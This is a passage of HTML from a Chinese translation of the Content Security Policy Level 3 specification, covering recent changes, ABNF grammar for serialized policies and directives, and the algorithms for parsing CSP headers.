                <li data-md>
                    <p><code>report-uri</code> 指令被弃用，改为使用新的 <code>report-to</code> 指令，它依赖于<a data-link-type="biblio"
                            href="#biblio-reporting" title="Reporting API">[REPORTING]</a> 作为基础设施。</p>
                <li data-md>
                    <p><code>'strict-dynamic'</code> 源表达式现在允许在页面上执行的脚本通过非 <a data-link-type="dfn"
                            href="https://html.spec.whatwg.org/#parser-inserted"
                            id="ref-for-parser-inserted">“解析器插入”</a>的
                        <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script">script</a></code>
                        元素加载更多脚本。详情参见 <a href="#strict-dynamic-usage">§ 8.2 关于 "'strict-dynamic'" 的使用</a>。
                    </p>
                <li data-md>
                    <p><code>'unsafe-hashes'</code> 源表达式现在允许事件处理程序、样式属性和 <code>javascript:</code> 导航目标匹配哈希。详情参见 <a
                            href="#unsafe-hashes-usage">§ 8.3 关于 "'unsafe-hashes'" 的使用</a>。</p>
                <li data-md>
                    <p><a data-link-type="dfn" href="#source-expression" id="ref-for-source-expression">源表达式</a>
                        的匹配已更改为要求明确存在任何非 <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#http-scheme"
                            id="ref-for-http-scheme">HTTP(S) 方案</a>，而非<a data-link-type="dfn"
                            href="https://fetch.spec.whatwg.org/#local-scheme" id="ref-for-local-scheme">本地方案</a>，除非该非
                        <a data-link-type="dfn" href="https://fetch.spec.whatwg.org/#http-scheme"
                            id="ref-for-http-scheme①">HTTP(S) 方案</a> 与受保护资源的方案相同，如在 <a
                            href="#match-url-to-source-expression" id="ref-for-match-url-to-source-expression">§ 6.7.2.8
                            URL 与原点中的表达式和重定向计数匹配</a> 中所述。
                    </p>
                <li data-md>
                    <p>哈希源表达式现在可能匹配外部脚本，前提是触发请求的
                        <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script①">script</a></code>
                        元素指定了一组列在当前策略中的完整性元数据。详情见 <a href="#external-hash">§ 8.4 通过哈希允许外部 JavaScript</a>。
                    </p>
                <li data-md>
                    <p>针对内联违规生成的报告将包含 <a data-link-type="dfn" href="#violation-sample"
                            id="ref-for-violation-sample">示例</a> 属性（如果相关指令包含 <a data-link-type="grammar"
                            href="#grammardef-report-sample"
                            id="ref-for-grammardef-report-sample"><code>'report-sample'</code></a> 表达式）。</p>
            </ol>
        </section>
        <section>
            <h2 class="heading settled" data-level="2" id="framework"><span class="secno">2. </span><span
                    class="content">框架</span><a class="self-link" href="#framework"></a></h2>
            <h3 class="heading settled" data-level="2.1" id="framework-infrastructure"><span class="secno">2.1.
                </span><span class="content">基础设施</span><a class="self-link" href="#framework-infrastructure"></a></h3>
            <p>本文档使用 ABNF 语法定义句法，参见<a data-link-type="biblio" href="#biblio-rfc5234"
                    title="扩展 BNF 语法规范：ABNF">[RFC5234]</a>。此外还依赖于 <a data-link-type="biblio" href="#biblio-rfc9110"
                    title="HTTP 语义">[RFC9110]</a> 中<a href="https://tools.ietf.org/html/rfc9110#section-5.6.1">第 5.6.1
                    节</a>中定义的 <code>#rule</code> ABNF 扩展，修改内容是将 <a data-link-type="grammar"
                    href="https://tools.ietf.org/html/rfc9110#section-5.6.3" id="ref-for-section-5.6.3">OWS</a> 替换为 <a
                    data-link-type="grammar" href="#grammardef-optional-ascii-whitespace"
                    id="ref-for-grammardef-optional-ascii-whitespace">可选 ASCII 空白符</a>。即，本文档中使用的 <code>#rule</code>
                定义如下：</p>
            <pre>1#element => element *( <a data-link-type="grammar" href="#grammardef-optional-ascii-whitespace" id="ref-for-grammardef-optional-ascii-whitespace①">可选 ASCII 空白符</a> "," <a data-link-type="grammar" href="#grammardef-optional-ascii-whitespace" id="ref-for-grammardef-optional-ascii-whitespace②">可选 ASCII 空白符</a> element )
</pre>
            <p>对于 n >= 1 和 m > 1：</p>
            <pre>&lt;n>#&lt;m>element => element &lt;n-1>*&lt;m-1>( <a data-link-type="grammar" href="#grammardef-optional-ascii-whitespace" id="ref-for-grammardef-optional-ascii-whitespace③">可选 ASCII 空白符</a> "," <a data-link-type="grammar" href="#grammardef-optional-ascii-whitespace" id="ref-for-grammardef-optional-ascii-whitespace④">可选 ASCII 空白符</a> element )
</pre>
            <p>本文档依赖于 Infra 标准提供的多个用于算法和书写的基础概念 <a data-link-type="biblio" href="#biblio-infra"
                    title="Infra 标准">[INFRA]</a>。</p>
            <p>以下定义用于提高本文档中其他定义的可读性。</p>
            <pre><dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-optional-ascii-whitespace">可选 ASCII 空白符</dfn> = *( %x09 / %x0A / %x0C / %x0D / %x20 )
<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-required-ascii-whitespace">必需 ASCII 空白符</dfn> = 1*( %x09 / %x0A / %x0C / %x0D / %x20 )
; 这些生成规则符合 <a data-link-type="grammar" href="https://infra.spec.whatwg.org/#ascii-whitespace" id="ref-for-ascii-whitespace">ASCII 空白符</a> 的定义，出自 <a data-link-type="grammar" href="https://infra.spec.whatwg.org/#" id="ref-for-something">INFRA</a> 标准。
</pre>
            <h3 class="heading settled" data-level="2.2" id="framework-policy"><span class="secno">2.2. </span><span
                    class="content">策略</span><a class="self-link" href="#framework-policy"></a></h3>
            <p>一个 <dfn class="dfn-paneled" data-dfn-type="dfn" data-export data-local-lt="policy" data-lt="内容安全策略对象"
                    id="content-security-policy-object">策略</dfn> 定义了允许和限制的行为，可以应用于 <code
                    class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#document" id="ref-for-document①">Document</a></code>、<code
                    class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/workers.html#workerglobalscope" id="ref-for-workerglobalscope">WorkerGlobalScope</a></code>
                或 <code
                    class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/worklets.html#workletglobalscope" id="ref-for-workletglobalscope">WorkletGlobalScope</a></code>。
            </p>
            <p>每个策略都有一个关联的 <dfn class="dfn-paneled" data-dfn-for="policy" data-dfn-type="dfn" data-export
                    id="policy-directive-set">指令集</dfn>，它是一个 <a data-link-type="dfn"
                    href="https://infra.spec.whatwg.org/#ordered-set" id="ref-for-ordered-set">有序集合</a>，包含的 <a
                    data-link-type="dfn" href="#directives" id="ref-for-directives">指令</a>定义了应用策略时的具体效果。</p>
            <p>每个策略都有一个关联的 <dfn class="dfn-paneled" data-dfn-for="policy" data-dfn-type="dfn" data-export
                    id="policy-disposition">属性</dfn>，其值为 "<code>enforce</code>" 或 "<code>report</code>"。</p>
            <p>每个策略都有一个关联的 <dfn class="dfn-paneled" data-dfn-for="policy" data-dfn-type="dfn" data-export
                    id="policy-source">来源</dfn>，其值为 "<code>header</code>" 或 "<code>meta</code>"。</p>
            <p>每个策略都有一个关联的 <dfn class="dfn-paneled" data-dfn-for="policy" data-dfn-type="dfn" data-export
                    id="policy-self-origin">self-origin</dfn>，用于在匹配 <a data-link-type="grammar" href="#grammardef-self"
                    id="ref-for-grammardef-self"><code>'self'</code></a> 关键字时表示一个 <a data-link-type="dfn"
                    href="https://html.spec.whatwg.org/#concept-origin" id="ref-for-concept-origin">来源</a>。</p>
            <p class="note" role="note"><span class="marker">注意：</span> 这是为了方便对从父级继承策略的 <a data-link-type="dfn"
                    href="https://fetch.spec.whatwg.org/#local-scheme" id="ref-for-local-scheme①">本地方案</a> 文档/工作者进行 <a
                    data-link-type="grammar" href="#grammardef-self"
                    id="ref-for-grammardef-self①"><code>'self'</code></a> 检查。大多数情况下，这将是 <a data-link-type="dfn"
                    href="https://html.spec.whatwg.org/multipage/webappapis.html#environment-settings-object"
                    id="ref-for-environment-settings-object">环境设置对象</a>的<a data-link-type="dfn"
                    href="https://html.spec.whatwg.org/multipage/webappapis.html#concept-settings-object-origin"
                    id="ref-for-concept-settings-object-origin">来源</a>。</p>
            <p>多个 <a data-link-type="dfn" href="#content-security-policy-object"
                    id="ref-for-content-security-policy-object">策略</a> 可以应用于单个资源，集合在一起形成一个 <a data-link-type="dfn"
                    href="https://infra.spec.whatwg.org/#list" id="ref-for-list">列表</a>，被称为 <dfn class="dfn-paneled"
                    data-dfn-type="dfn" data-export id="csp-list">CSP 列表</dfn>。</p>
            <p>一个 <a data-link-type="dfn" href="#csp-list" id="ref-for-csp-list">CSP 列表</a> <dfn class="dfn-paneled"
                    data-dfn-type="dfn" data-export id="contains-a-header-delivered-content-security-policy">包含一个 header
                    提供的内容安全策略</dfn>，如果它 <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-contain"
                    id="ref-for-list-contain">包含</a>了一个 <a data-link-type="dfn" href="#content-security-policy-object"
                    id="ref-for-content-security-policy-object②">策略</a>，其 <a data-link-type="dfn" href="#policy-source"
                    id="ref-for-policy-source">来源</a>为 "<code>header</code>"。</p>
            <p>一个 <dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="serialized-csp">序列化 CSP</dfn> 是一个 <a
                    data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-string"
                    id="ref-for-ascii-string">ASCII 字符串</a>，由分号分隔的一系列 <a data-link-type="dfn"
                    href="#serialized-directive" id="ref-for-serialized-directive">序列化指令</a> 组成，符合以下 ABNF 语法 <a
                    data-link-type="biblio" href="#biblio-rfc5234" title="扩展 BNF 语法规范：ABNF">[RFC5234]</a>：</p>
            <pre><dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-serialized-policy">serialized-policy</dfn> =
    <a data-link-type="grammar" href="#grammardef-serialized-directive" id="ref-for-grammardef-serialized-directive">serialized-directive</a> *( <a data-link-type="grammar" href="#grammardef-optional-ascii-whitespace" id="ref-for-grammardef-optional-ascii-whitespace⑤">可选 ASCII 空白符</a> ";" [ <a data-link-type="grammar" href="#grammardef-optional-ascii-whitespace" id="ref-for-grammardef-optional-ascii-whitespace⑥">可选 ASCII 空白符</a> <a data-link-type="grammar" href="#grammardef-serialized-directive" id="ref-for-grammardef-serialized-directive①">serialized-directive</a> ] )
</pre>
            <p>一个<dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="serialized-csp-list">序列化的 CSP
                    列表</dfn>是一个<a data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-string"
                    id="ref-for-ascii-string①">ASCII 字符串</a>，由逗号分隔的一系列<a data-link-type="dfn" href="#serialized-csp"
                    id="ref-for-serialized-csp">序列化的 CSP</a>组成，遵循以下 ABNF 语法 <a data-link-type="biblio"
                    href="#biblio-rfc5234" title="Augmented BNF for Syntax Specifications: ABNF">[RFC5234]</a>：</p>
            <pre><dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-serialized-policy-list">serialized-policy-list</dfn> = 1#<a data-link-type="grammar" href="#grammardef-serialized-policy" id="ref-for-grammardef-serialized-policy">serialized-policy</a>
                    ; '#' 规则是在 RFC 9110 第 5.6.1 节中定义的规则
                    ; 但它包含了本文档第 2.1 节中指定的修改。
</pre>

            <h4 class="heading settled algorithm" data-algorithm="解析序列化的 CSP" data-level="2.2.1"
                id="parse-serialized-policy"><span class="secno">2.2.1. </span><span class="content">解析序列化的 CSP</span><a
                    class="self-link" href="#parse-serialized-policy"></a></h4>
            <p>为了 <dfn class="dfn-paneled" data-dfn-type="abstract-op" data-export
                    id="abstract-opdef-parse-a-serialized-csp">解析序列化的 CSP</dfn>，给定一个 <a data-link-type="dfn"
                    href="https://infra.spec.whatwg.org/#byte-sequence" id="ref-for-byte-sequence">字节序列</a> 或 <a
                    data-link-type="dfn" href="https://infra.spec.whatwg.org/#string" id="ref-for-string">字符串</a>
                <var>serialized</var>，一个 <a data-link-type="dfn" href="#policy-source"
                    id="ref-for-policy-source①">来源</a> <var>source</var>，以及一个 <a data-link-type="dfn"
                    href="#policy-disposition" id="ref-for-policy-disposition">属性</a> <var>disposition</var>，执行以下步骤。
            </p>
            <p>此算法返回一个 <a data-link-type="dfn" href="#content-security-policy-object"
                    id="ref-for-content-security-policy-object③">内容安全策略对象</a>。如果 <var>serialized</var> 无法解析，则对象的 <a
                    data-link-type="dfn" href="#policy-directive-set" id="ref-for-policy-directive-set">指令集</a>将为空。</p>
            <ol class="algorithm">
                <li data-md>
                    <p>如果 <var>serialized</var> 是一个 <a data-link-type="dfn"
                            href="https://infra.spec.whatwg.org/#byte-sequence" id="ref-for-byte-sequence①">字节序列</a>，则将
                        <var>serialized</var> 设置为通过 <a data-link-type="dfn"
                            href="https://infra.spec.whatwg.org/#isomorphic-decode"
                            id="ref-for-isomorphic-decode">同构解码</a>后的 <var>serialized</var>。
                    </p>
                <li data-md>
                    <p>令 <var>policy</var> 为一个新的 <a data-link-type="dfn" href="#content-security-policy-object"
                            id="ref-for-content-security-policy-object④">策略</a>，其具有一个空的 <a data-link-type="dfn"
                            href="#policy-directive-set" id="ref-for-policy-directive-set①">指令集</a>，<a
                            data-link-type="dfn" href="#policy-source" id="ref-for-policy-source②">来源</a> 为
                        <var>source</var>，<a data-link-type="dfn" href="#policy-disposition"
                            id="ref-for-policy-disposition①">属性</a> 为 <var>disposition</var>。
                    </p>
                <li data-md>
                    <p><a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-iterate"
                            id="ref-for-list-iterate">对于每个</a> 通过 <a data-link-type="dfn"
                            href="https://infra.spec.whatwg.org/#strictly-split" id="ref-for-strictly-split">严格分割</a>
                        <var>serialized</var> 的 U+003B 分号字符（<code>;</code>）返回的 <var>token</var>：
                    </p>
                    <ol>
                        <li data-md>
                            <p><a data-link-type="dfn"
                                    href="https://infra.spec.whatwg.org/#strip-leading-and-trailing-ascii-whitespace"
                                    id="ref-for-strip-leading-and-trailing-ascii-whitespace">移除</a> <var>token</var> 的前后
                                ASCII 空白符。</p>
                        <li data-md>
                            <p>如果 <var>token</var> 是空字符串，或者 <var>token</var> 不是 <a data-link-type="dfn"
                                    href="https://infra.spec.whatwg.org/#ascii-string" id="ref-for-ascii-string②">ASCII
                                    字符串</a>，则 <a data-link-type="dfn"
                                    href="https://infra.spec.whatwg.org/#iteration-continue"
                                    id="ref-for-iteration-continue">继续</a>。</p>
                        <li data-md>
                            <p>令 <var>directive name</var> 为从 <var>token</var> 中<a data-link-type="dfn"
                                    href="https://infra.spec.whatwg.org/#collect-a-sequence-of-code-points"
                                    id="ref-for-collect-a-sequence-of-code-points">收集</a>非 <a data-link-type="dfn"
                                    data-refhint-key="https://infra.spec.whatwg.org/#ascii-whitespace"
                                    href="https://infra.spec.whatwg.org/#ascii-whitespace"
                                    id="ref-for-ascii-whitespace①">ASCII 空白字符</a>的代码点序列的结果。</p>
                        <li data-md>
                            <p>将 <var>directive name</var> 设置为对 <var>directive name</var> 执行 <a data-link-type="dfn"
                                    href="https://infra.spec.whatwg.org/#ascii-lowercase"
                                    id="ref-for-ascii-lowercase">ASCII 小写转换</a> 的结果。</p>
                            <p class="note" role="note"><span class="marker">注意：</span>
                                指令名称是大小写不敏感的，例如：<code>script-SRC 'none'</code> 和 <code>ScRiPt-sRc 'none'</code> 是等价的。
                            </p>
                        <li data-md>
                            <p>如果 <var>policy</var> 的 <a data-link-type="dfn" href="#policy-directive-set"
                                    id="ref-for-policy-directive-set②">指令集</a> 中包含名称为 <var>directive name</var> 的 <a
                                    data-link-type="dfn" href="#directives" id="ref-for-directives①">指令</a>，则 <a
                                    data-link-type="dfn" href="https://infra.spec.whatwg.org/#iteration-continue"
                                    id="ref-for-iteration-continue①">继续</a>。</p>
                            <p class="note" role="note"><span class="marker">注意：</span>
                                在这种情况下，用户代理应该通知开发人员忽略了重复的指令。例如，可以在控制台中显示警告。</p>
                        <li data-md>
                            <p>令 <var>directive value</var> 为通过 <a data-link-type="dfn"
                                    href="https://infra.spec.whatwg.org/#split-on-ascii-whitespace"
                                    id="ref-for-split-on-ascii-whitespace">以 ASCII 空白符分割</a> <var>token</var> 的结果。</p>
                        <li data-md>
                            <p>令 <var>directive</var> 为一个新的 <a data-link-type="dfn" href="#directives"
                                    id="ref-for-directives②">指令</a>，其 <a data-link-type="dfn" href="#directive-name"
                                    id="ref-for-directive-name①">名称</a> 为 <var>directive name</var>，<a
                                    data-link-type="dfn" href="#directive-value" id="ref-for-directive-value">值</a> 为
                                <var>directive value</var>。
                            </p>
                        <li data-md>
                            <p><a data-link-type="dfn" href="https://infra.spec.whatwg.org/#set-append"
                                    id="ref-for-set-append">将</a> <var>directive</var> 添加到 <var>policy</var> 的 <a
                                    data-link-type="dfn" href="#policy-directive-set"
                                    id="ref-for-policy-directive-set③">指令集</a> 中。</p>
                    </ol>
                <li data-md>
                    <p>返回 <var>policy</var>。</p>
            </ol>
            <h4 class="heading settled dfn-paneled algorithm" data-algorithm="解析响应的内容安全策略" data-dfn-type="dfn"
                data-export data-level="2.2.2" data-lt="解析响应的内容安全策略" id="parse-response-csp"><span class="secno">2.2.2.
                </span><span class="content">解析 <var>response</var> 的内容安全策略</span><a class="self-link"
                    href="#parse-response-csp" id="ref-for-parse-response-csp"></a></h4>
            <p>为了 <dfn class="dfn-paneled" data-dfn-type="abstract-op" data-export
                    id="abstract-opdef-parse-a-responses-content-security-policies">解析响应的内容安全策略</dfn>，给定一个 <a
                    data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response"
                    id="ref-for-concept-response">响应</a> <var>response</var>，执行以下步骤。</p>
            <p>此算法返回一个 <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list" id="ref-for-list①">列表</a>，其中包含
                <a data-link-type="dfn" href="#content-security-policy-object"
                    id="ref-for-content-security-policy-object⑤">内容安全策略对象</a>。如果策略无法解析，则返回的列表将为空。
            </p>
            <ol class="algorithm">
                <li data-md>
                    <p>令 <var>policies</var> 为一个空的 <a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list"
                            id="ref-for-list②">列表</a>。</p>
                <li data-md>
                    <p><a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-iterate"
                            id="ref-for-list-iterate①">对于每个</a> 通过 <a data-link-type="dfn"
                            href="https://fetch.spec.whatwg.org/#extract-header-list-values"
                            id="ref-for-extract-header-list-values">提取响应头列表值</a>获得的 <var>token</var>，其头为
                        <code>Content-Security-Policy</code>，来自 <var>response</var> 的 <a data-link-type="dfn"
                            href="https://fetch.spec.whatwg.org/#concept-response-header-list"
                            id="ref-for-concept-response-header-list">头列表</a>：
                    </p>
                    <ol>
                        <li data-md>
                            <p>令 <var>policy</var> 为<a data-link-type="abstract-op"
                                    href="#abstract-opdef-parse-a-serialized-csp"
                                    id="ref-for-abstract-opdef-parse-a-serialized-csp">解析</a> <var>token</var> 的结果，其<a
                                    data-link-type="dfn" href="#policy-source" id="ref-for-policy-source③">来源</a>为
                                "<code>header</code>"，且<a data-link-type="dfn" href="#policy-disposition"
                                    id="ref-for-policy-disposition②">处置方式</a>为 "<code>enforce</code>"。</p>
                        </li>
                        <li data-md>
                            <p>如果 <var>policy</var> 的<a data-link-type="dfn" href="#policy-directive-set"
                                    id="ref-for-policy-directive-set④">指令集</a>不为空，则将 <var>policy</var> 追加到
                                <var>policies</var>。
                            </p>
                        </li>
                    </ol>
                <li data-md>
                    <p><a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-iterate"
                            id="ref-for-list-iterate②">对于每个</a> 通过 <a data-link-type="dfn"
                            href="https://fetch.spec.whatwg.org/#extract-header-list-values"
                            id="ref-for-extract-header-list-values①">提取响应头列表值</a>获得的 <var>token</var>，其头为
                        <code>Content-Security-Policy-Report-Only</code>，来自 <var>response</var> 的 <a
                            data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response-header-list"
                            id="ref-for-concept-response-header-list①">头列表</a>：
                    </p>
                    <ol>
                        <li data-md>
                            <p>令 <var>policy</var> 为<a data-link-type="abstract-op"
                                    href="#abstract-opdef-parse-a-serialized-csp"
                                    id="ref-for-abstract-opdef-parse-a-serialized-csp①">解析</a> <var>token</var> 的结果，其<a
                                    data-link-type="dfn" href="#policy-source" id="ref-for-policy-source④">来源</a>为
                                "<code>header</code>"，且<a data-link-type="dfn" href="#policy-disposition"
                                    id="ref-for-policy-disposition③">处置方式</a>为 "<code>report</code>"。</p>
                        </li>
                        <li data-md>
                            <p>如果 <var>policy</var> 的<a data-link-type="dfn" href="#policy-directive-set"
                                    id="ref-for-policy-directive-set⑤">指令集</a>不为空，则将 <var>policy</var> 追加到
                                <var>policies</var>。
                            </p>
                        </li>
                    </ol>
                <li data-md>
                    <p><a data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-iterate"
                            id="ref-for-list-iterate③">对于每个</a> <var>policies</var> 中的 <var>policy</var>：</p>
                    <ol>
                        <li data-md>
                            <p>将 <var>policy</var> 的 <a data-link-type="dfn" href="#policy-self-origin"
                                    id="ref-for-policy-self-origin">self-origin</a> 设置为 <var>response</var> 的 <a
                                    data-link-type="dfn" href="https://fetch.spec.whatwg.org/#concept-response-url"
                                    id="ref-for-concept-response-url">url</a> 的 <a data-link-type="dfn"
                                    href="https://url.spec.whatwg.org/#concept-url-origin"
                                    id="ref-for-concept-url-origin">来源</a>。</p>
                    </ol>
                <li data-md>
                    <p>返回 <var>policies</var>。</p>
            </ol>
            <p class="note" role="note"><span class="marker">注意：</span> 当 <a data-link-type="abstract-op"
                    href="#abstract-opdef-parse-a-responses-content-security-policies"
                    id="ref-for-abstract-opdef-parse-a-responses-content-security-policies">解析响应的内容安全策略</a> 时，如果得到的
                <var>policies</var> 最终包含至少一项，用户代理可以在 <var>policies</var> 上持有一个标志，并使用该标志来优化 <a data-link-type="dfn"
                    href="#contains-a-header-delivered-content-security-policy"
                    id="ref-for-contains-a-header-delivered-content-security-policy">包含头部传递的内容安全策略</a> 算法。
            </p>
            <h3 class="heading settled" data-level="2.3" id="framework-directives"><span class="secno">2.3. </span><span
                    class="content">指令</span><a class="self-link" href="#framework-directives"></a></h3>
            <p>每个 <a data-link-type="dfn" href="#content-security-policy-object"
                    id="ref-for-content-security-policy-object⑥">策略</a> 包含一个 <a data-link-type="dfn"
                    href="https://infra.spec.whatwg.org/#ordered-set" id="ref-for-ordered-set①">有序集合</a> 的 <dfn
                    class="dfn-paneled" data-dfn-type="dfn" data-export id="directives">指令</dfn>（其 <a
                    data-link-type="dfn" href="#policy-directive-set"
                    id="ref-for-policy-directive-set⑥">指令集</a>），每个指令控制特定的行为。本文件中定义的指令在 <a href="#csp-directives">§ 6
                    内容安全策略指令</a> 中有详细描述。</p>
            <p>每个 <a data-link-type="dfn" href="#directives" id="ref-for-directives③">指令</a> 是一个 <dfn
                    class="dfn-paneled" data-dfn-for="directive" data-dfn-type="dfn" data-export
                    id="directive-name">名称</dfn> / <dfn class="dfn-paneled" data-dfn-for="directive" data-dfn-type="dfn"
                    data-export id="directive-value">值</dfn> 对。<a data-link-type="dfn" href="#directive-name"
                    id="ref-for-directive-name②">名称</a> 是一个非空的 <a data-link-type="dfn"
                    href="https://infra.spec.whatwg.org/#string" id="ref-for-string①">字符串</a>，而 <a data-link-type="dfn"
                    href="#directive-value" id="ref-for-directive-value①">值</a> 是一个非空 <a data-link-type="dfn"
                    href="https://infra.spec.whatwg.org/#string" id="ref-for-string②">字符串</a> 的 <a data-link-type="dfn"
                    href="https://infra.spec.whatwg.org/#ordered-set" id="ref-for-ordered-set②">集合</a>。<a
                    data-link-type="dfn" href="#directive-value" id="ref-for-directive-value②">值</a> 可以是 <a
                    data-link-type="dfn" href="https://infra.spec.whatwg.org/#list-is-empty"
                    id="ref-for-list-is-empty">空的</a>。</p>
            <p><dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="serialized-directive">序列化的指令</dfn> 是一个 <a
                    data-link-type="dfn" href="https://infra.spec.whatwg.org/#ascii-string"
                    id="ref-for-ascii-string③">ASCII 字符串</a>，由一个或多个空格分隔的标记组成，并遵循以下 ABNF 规范 <a data-link-type="biblio"
                    href="#biblio-rfc5234" title="Augmented BNF for Syntax Specifications: ABNF">[RFC5234]</a>：</p>
            <pre><dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-serialized-directive">serialized-directive</dfn> = <a data-link-type="grammar" href="#grammardef-directive-name" id="ref-for-grammardef-directive-name">directive-name</a> [ <a data-link-type="grammar" href="#grammardef-required-ascii-whitespace" id="ref-for-grammardef-required-ascii-whitespace">required-ascii-whitespace</a> <a data-link-type="grammar" href="#grammardef-directive-value" id="ref-for-grammardef-directive-value">directive-value</a> ]
<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-directive-name">directive-name</dfn>       = 1*( <a data-link-type="grammar" href="https://tools.ietf.org/html/rfc5234#appendix-B.1" id="ref-for-appendix-B.1">ALPHA</a> / <a data-link-type="grammar" data-refhint-key="3060c9b4" href="https://tools.ietf.org/html/rfc5234#appendix-B.1" id="ref-for-appendix-B.1①">DIGIT</a> / "-" )
<dfn class="dfn-paneled" data-dfn-type="grammar" data-export id="grammardef-directive-value">directive-value</dfn>      = *( <a data-link-type="grammar" href="#grammardef-required-ascii-whitespace" id="ref-for-grammardef-required-ascii-whitespace①">required-ascii-whitespace</a> / ( %x21-%x2B / %x2D-%x3A / %x3C-%x7E ) )
                        ; 指令值可以包含空白字符和 <a data-link-type="grammar" data-refhint-key="3fed24ef" href="https://tools.ietf.org/html/rfc5234#appendix-B.1" id="ref-for-appendix-B.1②">VCHAR</a> 字符，
                        ; 不包括 ";" 和 ","。上面定义的后半部分
                        ; 表示所有 <a data-link-type="grammar" data-refhint-key="3fed24ef" href="https://tools.ietf.org/html/rfc5234#appendix-B.1" id="ref-for-appendix-B.1③">VCHAR</a> 字符 (%x21-%x7E)
                        ; 不包括 ";" 和 "," (分别为 %x3B 和 %x2C)

; <a data-link-type="grammar" href="https://tools.ietf.org/html/rfc5234#appendix-B.1" id="ref-for-appendix-B.1④">ALPHA</a>、<a data-link-type="grammar" data-refhint-key="3060c9b4" href="https://tools.ietf.org/html/rfc5234#appendix-B.1" id="ref-for-appendix-B.1⑤">DIGIT</a> 和 <a data-link-type="grammar" data-refhint-key="3fed24ef" href="https://tools.ietf.org/html/rfc5234#appendix-B.1" id="ref-for-appendix-B.1⑥">VCHAR</a> 在 RFC 5234 的附录 B.1 中定义。
</pre>
            <p><a data-link-type="dfn" href="#directives" id="ref-for-directives④">指令</a> 有多个相关的算法：</p>
            <ol>
                <li data-md>
                    <p><dfn class="dfn-paneled" data-dfn-for="directive" data-dfn-type="dfn" data-export
                            id="directive-pre-request-check">请求前检查</dfn>，其参数是一个 <a data-link-type="dfn"
                            href="https://fetch.spec.whatwg.org/#concept-request" id="ref-for-concept-request">请求</a>
                        和一个 <a data-link-type="dfn" href="#content-security-policy-object"
                            id="ref-for-content-security-policy-object⑦">策略</a>，并在 <a href="#should-block-request"
                            id="ref-for-should-block-request">§ 4.1.2 内容安全策略是否应阻止请求？</a> 中执行。除非另有说明，否则此算法返回
                        "<code>Allowed</code>"。</p>
                <li data-md>
                    <p><dfn class="dfn-paneled" data-dfn-for="directive" data-dfn-type="dfn" data-export
                            id="directive-post-request-check">请求后检查</dfn>，其参数是一个 <a data-link-type="dfn"
                            href="https://fetch.spec.whatwg.org/#concept-request"
                            id="ref-for-concept-request①">请求</a>、一个 <a data-link-type="dfn"
                            href="https://fetch.spec.whatwg.org/#concept-response"
                            id="ref-for-concept-response①">响应</a>，以及一个 <a data-link-type="dfn"
                            href="#content-security-policy-object"
                            id="ref-for-content-security-policy-object⑧">策略</a>，并在 <a href="#should-block-response"
                            id="ref-for-should-block-response">§ 4.1.3 内容安全策略是否应阻止响应请求？</a> 中执行。除非另有说明，否则此算法返回
                        "<code>Allowed</code>"。</p>
                <li data-md>
                    <p><dfn class="dfn-paneled" data-dfn-for="directive" data-dfn-type="dfn" data-export
                            id="directive-inline-check">内联检查</dfn>，其参数是一个 <code
                            class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#element" id="ref-for-element">元素</a></code>、一个类型字符串、一个
                        <a data-link-type="dfn" href="#content-security-policy-object"
                            id="ref-for-content-security-policy-object⑨">策略</a> 以及一个源字符串，并在 <a
                            href="#should-block-inline" id="ref-for-should-block-inline">§ 4.2.3
                            内容安全策略是否应阻止元素的内联类型行为？</a> 和 <a href="#should-block-navigation-request"
                            id="ref-for-should-block-navigation-request">§ 4.2.4 内容安全策略是否应阻止导航请求类型？</a> 对
                        <code>javascript:</code> 请求执行。除非另有说明，否则此算法返回 "<code>Allowed</code>"。
                    </p>
                <li data-md>
                    <p><dfn class="dfn-paneled" data-dfn-for="directive" data-dfn-type="dfn" data-export
                            id="directive-initialization">初始化</dfn>，其参数是一个 <code
                            class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#document" id="ref-for-document②">文档</a></code>
                        或 <a data-link-type="dfn"
                            href="https://html.spec.whatwg.org/multipage/webappapis.html#global-object"
                            id="ref-for-global-object">全局对象</a> 以及一个 <a data-link-type="dfn"
                            href="#content-security-policy-object"
                            id="ref-for-content-security-policy-object①⓪">策略</a>。此算法在 <a
                            href="#run-document-csp-initialization" id="ref-for-run-document-csp-initialization">§ 4.2.1
                            为文档运行 CSP 初始化</a> 和 <a href="#run-global-object-csp-initialization"
                            id="ref-for-run-global-object-csp-initialization">§ 4.2.6 为全局对象运行 CSP 初始化</a>
                        中执行。除非另有说明，否则它没有影响并返回 "<code>Allowed</code>"。</p>
                <li data-md>
                    <p><dfn class="dfn-paneled" data-dfn-for="directive" data-dfn-type="dfn" data-export
                            id="directive-pre-navigation-check">导航前检查</dfn>，其参数是一个 <a data-link-type="dfn"
                            href="https://fetch.spec.whatwg.org/#concept-request"
                            id="ref-for-concept-request②">请求</a>、一个导航类型字符串（"<code>form-submission</code>" 或
                        "<code>other</code>"），以及一个 <a data-link-type="dfn" href="#content-security-policy-object"
                            id="ref-for-content-security-policy-object①①">策略</a>，并在 <a
